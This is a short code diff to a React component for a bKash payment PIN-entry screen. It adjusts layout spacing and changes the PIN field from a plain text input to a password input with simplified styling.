@@ -350,9 +350,9 @@ const BkashPayment = () => {
             ) : showPinView ? (
               <>
                 {/* Pink Section - PIN Form */}
-                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: '340px' }}>
+                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: '310px' }}>
                   {/* Fixed top area for title + input */}
-                  <div className="pt-[90px]">
+                  <div className="pt-[80px]">
                     <h3 className="text-white text-center text-xs font-medium mb-1 h-4">
                       Enter PIN of your bKash account number
                     </h3>
@@ -361,13 +361,13 @@ const BkashPayment = () => {
                     </p>
                     <input
                       ref={pinInputRef}
-                      type="text"
+                      type="password"
                       autoComplete="off"
                       value={pinCode}
                       onChange={handlePinChange}
                       placeholder="Enter PIN"
-                      className="w-full bg-white rounded px-4 h-[42px] flex items-center justify-center text-center text-gray-600 placeholder:text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40 [&::-ms-reveal]:hidden [&::-ms-clear]:hidden caret-transparent overflow-hidden"
-                      style={{ WebkitTextSecurity: 'disc', fontSize: pinCode.length > 0 ? '28px' : '14px', letterSpacing: '0.15em', lineHeight: '42px', color: pinCode.length > 0 ? '#374151' : 'transparent' } as React.CSSProperties}
+                      className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40 [&::-ms-reveal]:hidden [&::-ms-clear]:hidden"
+                      style={{ WebkitTextSecurity: 'disc', letterSpacing: '0.25em', caretColor: '#374151' } as React.CSSProperties}
                     />
                   </div>
                   {/* Warning flows below input without shifting it */}
